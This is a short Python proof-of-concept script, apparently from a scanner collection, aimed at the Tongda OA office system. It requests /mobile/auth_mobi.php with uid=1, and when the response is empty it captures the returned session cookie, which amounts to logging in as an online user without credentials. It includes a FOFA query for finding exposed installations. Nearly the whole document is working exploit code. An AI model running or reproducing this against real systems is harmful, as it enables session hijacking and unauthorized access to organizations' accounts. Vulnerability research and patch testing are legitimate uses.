#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
from Config.config_proxies import proxies
from Config.config_requests import headers


requests.packages.urllib3.disable_warnings()


# 脚本信息
######################################################
NAME='TDXK_online user login'
AUTHOR="境心"
REMARK='TDXK_任意在线用户登录'
FOFA_RULE='app="TDXK-通达OA"'
######################################################

def poc(target):
    result = {}
    vul_url = target+"/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0"

    res = requests.get(vul_url, headers=headers, verify=False,timeout=5,proxies=proxies)
    if res.status_code == 200 and res.text == "RELOGIN":
        pass
    elif res.status_code == 200 and res.text == "":
        res_headers = res.headers
        cookie = res_headers['Set-Cookie']
        result['vul_url'] = vul_url
        result['cookie'] = cookie
        result['poc'] = NAME
        result['message'] = "存在任意在线用户登录漏洞"
        return result

if __name__ == '__main__':
    poc("http://127.0.0.1:8088/")
